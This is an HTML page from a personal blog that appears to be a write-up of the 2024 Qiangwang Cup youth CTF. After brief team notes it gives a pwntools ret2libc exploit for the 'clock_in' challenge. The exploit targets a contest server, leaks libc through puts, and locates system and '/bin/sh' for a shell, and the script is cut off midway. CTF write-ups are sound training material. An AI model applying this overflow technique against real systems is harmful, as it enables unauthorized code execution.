@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.119.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="LittFlower." />
+  <meta property="og:url" content="http://littflower.github.io/posts/2024-qwbqs-writeup/" />
+  <link rel="canonical" href="http://littflower.github.io/posts/2024-qwbqs-writeup/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/littflower.github.io"
+      },
+      "articleSection" : "posts",
+      "name" : "2024 强网杯青少赛题解",
+      "headline" : "2024 强网杯青少赛题解",
+      "description" : "前言 战队名：crazyNAN\n战队排名：6\n战队整体答题情况：除 web 方向 cyberboard mysqlprobe 外均解出。\n这辈子最后一次打强网杯青少赛了，因为我今年刚满 18 岁（（（\n一开始把这事情都忘了，还是 Aura 师傅拉我我才想起来，打着玩玩，话又说回来初赛和这 b Aura 有个🥚的关系啊（（\n全靠 👴 和 🌳 带飞（\n杂鱼 Aura\nWp 赛时开了个飞书云文档，边打边写 wp，感觉确实不错，不用赛后专门整理 wp 了。\n我这里就把我做的 pwn 题发一下，剩下的可以戳这个链接看 exp\nPwn clock_in 板子 ret2libc，exp:\nfrom pwn import * from sys import argv proc = \u0026#34;.\/clock_in\u0026#34; context.log_level = \u0026#34;debug\u0026#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(\u0026#34;.\/libc.so.6\u0026#34;) io = remote(\u0026#34;101.200.61.16\u0026#34;, 34841) if argv[1] == \u0026#39;r\u0026#39; else process(proc) if args.",
+      "inLanguage" : "en-US",
+      "author" : "LittFlower.",
+      "creator" : "LittFlower.",
+      "publisher": "LittFlower.",
+      "accountablePerson" : "LittFlower.",
+      "copyrightHolder" : "LittFlower.",
+      "copyrightYear" : "2024",
+      "datePublished": "2024-11-25 16:55:35 \u002b0800 CST",
+      "dateModified" : "2024-11-25 16:55:35 \u002b0800 CST",
+      "url" : "http:\/\/littflower.github.io\/posts\/2024-qwbqs-writeup\/",
+      "keywords" : [ "Pwn", ]
+  }
+</script>
+<title>2024 强网杯青少赛题解</title>
+  <meta property="og:title" content="2024 强网杯青少赛题解" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="前言 战队名：crazyNAN
+战队排名：6
+战队整体答题情况：除 web 方向 cyberboard mysqlprobe 外均解出。
+这辈子最后一次打强网杯青少赛了，因为我今年刚满 18 岁（（（
+一开始把这事情都忘了，还是 Aura 师傅拉我我才想起来，打着玩玩，话又说回来初赛和这 b Aura 有个🥚的关系啊（（
+全靠 👴 和 🌳 带飞（
+杂鱼 Aura
+Wp 赛时开了个飞书云文档，边打边写 wp，感觉确实不错，不用赛后专门整理 wp 了。
+我这里就把我做的 pwn 题发一下，剩下的可以戳这个链接看 exp
+Pwn clock_in 板子 ret2libc，exp:
+from pwn import * from sys import argv proc = &amp;#34;./clock_in&amp;#34; context.log_level = &amp;#34;debug&amp;#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(&amp;#34;./libc.so.6&amp;#34;) io = remote(&amp;#34;101.200.61.16&amp;#34;, 34841) if argv[1] == &amp;#39;r&amp;#39; else process(proc) if args." />
+  <meta name="description" content="前言 战队名：crazyNAN
+战队排名：6
+战队整体答题情况：除 web 方向 cyberboard mysqlprobe 外均解出。
+这辈子最后一次打强网杯青少赛了，因为我今年刚满 18 岁（（（
+一开始把这事情都忘了，还是 Aura 师傅拉我我才想起来，打着玩玩，话又说回来初赛和这 b Aura 有个🥚的关系啊（（
+全靠 👴 和 🌳 带飞（
+杂鱼 Aura
+Wp 赛时开了个飞书云文档，边打边写 wp，感觉确实不错，不用赛后专门整理 wp 了。
+我这里就把我做的 pwn 题发一下，剩下的可以戳这个链接看 exp
+Pwn clock_in 板子 ret2libc，exp:
+from pwn import * from sys import argv proc = &amp;#34;./clock_in&amp;#34; context.log_level = &amp;#34;debug&amp;#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(&amp;#34;./libc.so.6&amp;#34;) io = remote(&amp;#34;101.200.61.16&amp;#34;, 34841) if argv[1] == &amp;#39;r&amp;#39; else process(proc) if args." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:sarasa-fixed-sc,sans-serif;-webkit-font-smoothing:antialiased;src:url(https://cdn.jsdelivr.net/npm/firacode@6.2.0/distr/ttf/FiraCode-Light.ttf)format('ttf');margin:0 20px}article{max-width:1100px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:700;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:17.5px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#4005f3}.markdown-body blockquote{margin:0;padding:0 1em;color:#494d53;border-left:.25em solid #0b79e7}.markdown-body pre{padding:12px;overflow:auto;border-radius:10px}.markdown-body code{padding:.1em 0;font-size:100%;background-color:#eef1f3;border-radius:6px}.markdown-body pre>code{padding:0;font-size:95%;background-color:inherit;border:0}.markdown-body pre{background-color:#272822}.hljs{font-size:17.2px;color:#eef1f3}ul,ol{margin:.25em 0;line-height:1.6}ul ul,ul ol,ol ul,ol ol{margin:.25em 0}li{padding:.25em 0}h1{font-size:1.83rem}h2{font-size:1.74rem}h3{font-size:1.45rem}h4{font-size:1.28rem}h5{font-size:1.16rem}h6{font-size:1.21rem}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:source code pro,sans-serif;src:url(https://cdn.jsdelivr.net/npm/source-code-pro@2.38.0/WOFF/TTF/SourceCodePro-Bold.ttf.woff)format("woff")}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:700}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}:root{--nav-width:1380px;--article-width:650px;--toc-width:300px}.toc{margin:0 2px 40px;border:1px solid var(--border);background:var(--entry);border-radius:var(--radius);padding:.4em}.toc-container.wide{position:absolute;height:100%;border-right:1px solid var(--border);left:calc((var(--toc-width) + var(--gap)) * -1);top:calc(var(--gap) * 2);width:var(--toc-width)}.wide .toc{position:sticky;top:var(--gap);border:unset;background:unset;border-radius:unset;width:100%;margin:0 2px 40px}.toc details summary{cursor:zoom-in;margin-inline-start:20px;padding:12px 0}.toc details[open] summary{font-weight:500}.toc-container.wide .toc .inner{margin:0}.active{font-size:110%;font-weight:600}.toc ul{list-style-type:circle}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;font-size:16px;max-height:83vh;overflow-y:auto}.toc .inner::-webkit-scrollbar-thumb{background:var(--border);border:7px solid var(--theme);border-radius:var(--radius)}.toc li ul{margin-inline-start:calc(var(--gap) * .5);list-style-type:none}.toc li{list-style:none;font-size:.95rem;padding-bottom:5px}.toc li a:hover{color:var(--secondary)}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="一只花盆.">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >小花ฅ.</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/aboutme" target="_blank">AboutMe</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/LittFlower" target="_blank">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/friends" target="_blank">Friends</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">2024 强网杯青少赛题解</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2024-11-25 16:55:35 CST">
+                25 Nov 2024
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://blog.littflower.top">@LittFlower.</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h2 id="前言">前言</h2>
+<p>战队名：crazyNAN</p>
+<p>战队排名：6</p>
+<p>战队整体答题情况：除 web 方向 cyberboard mysqlprobe 外均解出。</p>
+<p>这辈子最后一次打强网杯青少赛了，因为我今年刚满 18 岁（（（</p>
+<p>一开始把这事情都忘了，还是 Aura 师傅拉我我才想起来，打着玩玩，话又说回来初赛和这 b Aura 有个🥚的关系啊（（</p>
+<p>全靠 👴 和 🌳 带飞（</p>
+<p><del>杂鱼 Aura</del></p>
+<h2 id="wp">Wp</h2>
+<p>赛时开了个飞书云文档，边打边写 wp，感觉确实不错，不用赛后专门整理 wp 了。</p>
+<p>我这里就把我做的 pwn 题发一下，剩下的可以戳这个链接看 <a href="https://bvx4hy6im9l.feishu.cn/wiki/LvdCwgCyniqVfWkRdEzc9UAvn2g?from=from_copylink">exp</a></p>
+<h3 id="pwn">Pwn</h3>
+<h4 id="clock_in">clock_in</h4>
+<p>板子 ret2libc，exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./clock_in&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;101.200.61.16&#34;</span>, <span style="color:#ae81ff">34841</span>) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *0x401252&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011C5</span>
+</span></span><span style="display:flex;"><span>get_info_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401202</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p64(get_info_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload1)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_addr =&gt; </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">system_addr =&gt; </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
